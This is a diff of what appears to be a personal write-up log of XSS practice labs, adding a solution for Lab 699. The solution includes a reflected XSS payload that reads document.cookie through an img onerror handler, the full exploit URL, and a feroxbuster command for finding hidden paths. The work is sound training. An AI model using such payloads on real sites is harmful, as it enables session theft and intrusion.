@@ -490,8 +490,17 @@ https://a7piuqnq.xssy.uk/target.ftl?name=%3Cimg+src%3D%27https%3A%2F%2Feqh42jmm.
 ---
 
 ### Lab 699: Unlinked
-- **URL Lab**: https://xssy.uk/lab/699
-- **Status**: Not solved yet
+- **URL Lab**: https://hacky.uk/lab/699
+- **Payload**: 
+```html
+test.ftl?name=<img%20src=x%20onx=w%20onerror=alert(document.cookie)>
+```
+- **Full URL**: 
+```
+https://32uzzqzc.hacky.uk/test.ftl?name=%3Cimg%20src=x%20onx=w%20onerror=alert(document.cookie)%3E
+```
+- **Description**: We need to fuzzing/using feroxbuster to find hidden path first, and then I found path test.ftl and then direct access https://32uzzqzc.hacky.uk/test.ftl. Found param name in code. Craft full payload url/path/?param=payload xss
+- Feroxbuster command:  feroxbuster -u 'https://32uzzqzc.hacky.uk' -x ftl
 
 ---
 
